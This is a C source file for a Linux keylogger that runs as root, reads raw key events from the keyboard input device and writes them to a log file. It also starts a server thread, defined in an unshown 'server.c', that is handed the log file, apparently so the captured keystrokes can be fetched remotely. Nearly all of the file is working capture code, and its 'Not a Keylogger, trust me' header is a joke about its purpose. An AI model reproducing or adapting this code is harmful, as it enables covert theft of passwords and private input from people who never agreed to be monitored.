// Not a Keylogger, trust me
//
// This program reads keys from the keyboard buffer
// and displays them on screen.
//
// Usage: sudo ./naktm
// MUST RUN AS SUPERUSER!
// MUST SPECIFY YOUR DEVICE EVENT TO READ FROM.
// SEE COMMENTS AT THE BEGINNING OF MAIN!
//
// for extra fun, run xev from terminal

//* Device info is available with the command
//        * cat /proc/bus/input/devices
// ====================================

#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h> // key defines can be found in here
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include "server.c"
#include "keymap.h"
#include "keyboard-finder.h"

#define VERBOSE 1 // determines if keyboard_mapping prints things out
#define DEBUG 0   // determines if logged keys are also printed to stdout

int main() {

    // variable declarations
    pthread_t servThread;
    FILE *logfile;
    int keyfd;
    char *keyboard, cwd[1024];
    ssize_t rd;
    struct input_event event; // buffer to hold keyboard reads


    // Say hello
    printf("Welcome to the keylogger! Enjoy your stay.\n");

    // create a new log file with read/write permissions
    logfile = fopen(LOGFILE_NAME, "w+");
    getcwd(cwd, 1024);
    // send a thread to run a server
    pthread_create(&servThread, NULL, server, (void*) logfile );

    // detect the keyboard device
	keyboard = find_keyboard_device(VERBOSE);
    if (keyboard == NULL) {
		keyboard = "/dev/input/event3";
		printf("Automatic keyboard device detection failed.\n");
		printf("Reverting to manual keyboard device: %s\n", keyboard);	
	}


    /* attempt to open the keyboard file */
    if ( (keyfd = open(keyboard, O_RDONLY)) > 0){
        printf("KEYBOARD DEVICE: %s\nFILE DESCRIPTOR: %d\n", keyboard, keyfd);
        printf("SAVE TO: %s/%s\n", cwd, LOGFILE_NAME);

        /* infinite loop to read keystrokes from file. */
        /* read() will block until there is data to read. */
        /* attempting to read the entire input event and store it in event */
        while ( (rd = read(keyfd, &event, sizeof(struct input_event))) ) {
            if (event.type == EV_KEY) {
                log_keystroke_humanformat(logfile, event);
				if (DEBUG) {
                	log_keystroke_humanformat(stdout, event);
					printf("\n");
				}
			}
        }
    } else {
        fprintf(stderr, "Error: Couldn't open keyboard file -- %s\n", strerror(errno));
        exit(1);
    }
    return 0;
}
